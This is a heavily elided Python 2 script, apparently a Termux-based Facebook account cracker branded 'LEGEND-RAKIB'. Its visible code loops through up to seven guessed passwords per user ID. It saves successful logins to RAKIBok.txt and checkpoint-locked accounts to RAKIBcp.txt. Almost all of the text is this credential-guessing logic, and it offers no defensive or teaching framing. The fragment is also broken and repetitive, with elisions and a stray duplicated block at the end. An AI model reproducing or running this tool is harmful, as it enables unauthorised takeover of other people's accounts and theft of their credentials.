...
def main():
    ...
    print '\x1b[1;93m[4] \x1b[1;92MR RAKIB TERMUX  '
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[LEGEND-RAKIB-OK] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('RAKIBok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[LEGEND-RAKIB-CP] ' + uid + ' | ' + pass1 + ' | ' + name
                cp = open('RAKIBcp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[LEGEND-RAKIB-OK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ok = open('RAKIBok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[LEGEND-RAKIB-CP] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('RAKIBcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[LEGEND-RAKIB-OK] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('RAKIBok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m[LEGEND-RAKIB-CP] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('RAKIBcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[LEGEND-RAKIB-OK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ok = open('RAKIBok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[LEGEND-RAKIB-CP] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('RAKIBcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[LEGEND-RAKIB-OK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ok = open('RAKIBok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m[LEGEND-RAKIB-CP] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('RAKIBcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[LEDEND-RAKIB-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('RAKIBok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;93m[LEGEND-RAKIB-CP] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('RAKIBcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[LEGEND-RAKIB-OK] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('RAKIBok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[LEGEND-RAKIB-CP] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('RAKIBcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                    ...
                    if 'access_token' in q:
                        ...
                        if 'access_token' in q:
                            ...
                            if 'access_token' in q:
                                ...
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[LEGEND-RAKIB-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('RAKIBok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
